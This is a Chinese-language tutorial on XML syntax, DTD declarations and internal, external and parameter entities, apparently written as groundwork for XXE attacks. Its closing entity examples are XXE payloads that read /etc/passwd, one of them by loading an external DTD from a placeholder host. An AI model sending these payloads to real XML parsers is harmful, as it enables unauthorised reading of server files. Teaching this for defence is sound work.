# XML 介绍

## XML 语法

1.  XML 声明文件，放在文件第一行

    ```xml
     <?xml version="1.0" encoding="UTF-8" ?>
    ```
2.  XML 必须包含根元素，比如下面的 userInfo 元素

    ```xml
    <userInfo>
        <name>d4m1ts</name>
        <age>18</age>
    </userInfo>
    ```
3.  所有的 XML元素必须闭合

    ```xml
    <p>paragraph</p> <!-- 后面的 </p> 不能省略 -->
    ```
4. XML 标签对大小写敏感
5.  所有的元素必须正确的嵌套

    ```xml
    <b><p>This text is bold and italic</b></p> <!-- 错误 -->
    <p><i>This text is bold and italic</i></p> <!-- 正确 -->
    ```
6.  属性都必须加双引号

    ```xml
    <p attr="加双引号">aa</p>
    ```
7.  XML 注释和 HTML 一样

    ```xml
    <!-- 我是注释 -->
    ```

## XML DTD

### DTD 简介

XML DTD 的作用是定义 XML 文档的合法构建模块，使用一系列的合法元素`定义文档结构`

* 内部 DOCTYPE 声明
  * ```xml
      <!-- 语法 -->
      <!DOCTYPE root-element [element-declarations]>
    ```
  * ```xml
      <?xml version="1.0" encoding="UTF-8" ?>
      <!DOCTYPE userInfo [
                <!ELEMENT userInfo (name,age)>
                <!ELEMENT name (#PCDATA)>
                <!ELEMENT age ANY>
                ]>
      
      <userInfo>
          <name>d4m1ts</name>
          <age>18</age>
      </userInfo>
    ```
  *   DTD 内容解释：

      > * `!DOCTYPE userInfo` : 表明此 DTD 文件是用于定义 userinfo 元素的结构
      > * `!ELEMENT userInfo (name,age)` ： 表明 userIndo 有两个元素 name、age
      > * `!ELEMENT name (#PCDATA)` ： 定义 name 元素的数据类型
      > * `!ELEMENT age ANY` : ANY 表示任何可解析的数据组合
* 外部 DOCTYPE 声明
  * ```xml
      <!-- 语法 -->
      <!DOCTYPE root-element SYSTEM "filename">
    ```
  * ```xml
      <!-- XML文件 -->
      <?xml version="1.0"?>
      <!DOCTYPE note SYSTEM "note.dtd">
      <note>
          <to>Tove</to>
          <from>Jani</from>
          <heading>Reminder</heading>
          <body>Don't forget me this weekend!</body>
      </note>
    ```
  * ```
      <!-- 包含 DTD 的 "note.dtd" 文件 -->
      <!ELEMENT note (to,from,heading,body)>
      <!ELEMENT to (#PCDATA)>
      <!ELEMENT from (#PCDATA)>
      <!ELEMENT heading (#PCDATA)>
      <!ELEMENT body (#PCDATA)>
    ```

### DTD 实体

> DTD 实体是用于**定义引用普通文本或特殊字符的快捷方式的`变量`**。

* 内部实体
  * ```xml
      <!-- 语法 -->
      <!ENTITY entity-name "entity-value">
    ```
  * ```xml
      <?xml version="1.0" encoding="UTF-8" ?>
      <!DOCTYPE userInfo [
                <!ELEMENT userInfo (name,age)>
                <!ELEMENT name (#PCDATA)>
                <!ELEMENT age (#PCDATA)>
                <!ENTITY name "d4m1ts">
                ]>
      
      <userInfo>
          <name>&name;</name>
          <age>18</age>
      </userInfo>
    ```
* 外部实体
  * ```xml
      <!-- 语法 -->
      <!ENTITY entity-name SYSTEM "URI/URL">
    ```
  * ```xml
      <!-- 不要求后缀一定是 dtd，只要符合 dtd 文件格式即可 -->
      <!ENTITY name SYSTEM "http://baidu.com/test.dtd">
    ```
*   通用实体

    ```
    <?xml version="1.0"?>
    <!DOCTYPE a [<!ENTITY b SYSTEM "file:///etc/passwd" >]>
    <x>&b;</x>
    ```

    *
*   参数实体

    ```
    <!-- http://xxx.com/xxe.dtd -->
    <!ENTITY xxe SYSTEM "file:///etc/passwd" >


    <?xml version="1.0"?>
    <!DOCTYPE a [<!ENTITY % d SYSTEM "http://xxx.com/xxe.dtd" >
    %d;
    ]>
    <x>&xxe;</x>
    ```

> * % 用于实体在 DTD 定义内部求值的情况
> * & 用于实体在 XML 文档中被求值的情况
